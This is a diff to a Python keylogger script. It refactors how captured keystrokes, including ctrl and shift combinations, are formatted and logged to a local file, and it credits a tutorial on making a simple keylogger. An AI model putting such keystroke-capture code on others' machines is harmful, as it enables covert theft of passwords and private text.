@@ -7,28 +7,42 @@ import string
 log_file = "log.txt"
 basicConfig(filename="log.txt", level=DEBUG, format="%(message)s")
 
+
 def ctrl_down():
+    """ Determine if either control key is pressed
+
+    """
     return GetKeyState(HookConstants.VKeyToID("VK_CONTROL"))
 
 def shift_down():
+    """ Determine if either shift key is pressed
+
+    """
     return GetKeyState(HookConstants.VKeyToID("VK_SHIFT"))
 
 def keylog(event):
+    """ Properly record key presses
+
+    """
     key=event.GetKey()
-    if ctrl_down() and shift_down():
-        log(10, "ctrl+shift+"+key)
-    elif ctrl_down():
+    ctrl = ctrl_down()
+    shift = shift_down()
+    if ctrl and shift:
+        final_key = "ctrl+shift+"+key
+    elif ctrl:
         if key in string.ascii_uppercase:
-            log(10, "ctrl+"+key.lower())
+            final_key = "ctrl+"+key.lower()
         else:
-            log(10, "ctrl+"+key)
-    elif shift_down():
-        log(10, key)
+            final_key = "ctrl+"+key
+    elif shift:
+        final_key = "shift+"+key
     else:
         if key in string.ascii_uppercase:
-            log(10, key.lower())
+            final_key = key.lower()
         else:
-            log(10, key)
+            final_key = key
+    log(10, final_key)
+
 
 # keyboardhooking courtesy of
 # http://www.tinkernut.com/2013/07/17/how-to-make-a-simple-python-keylogger
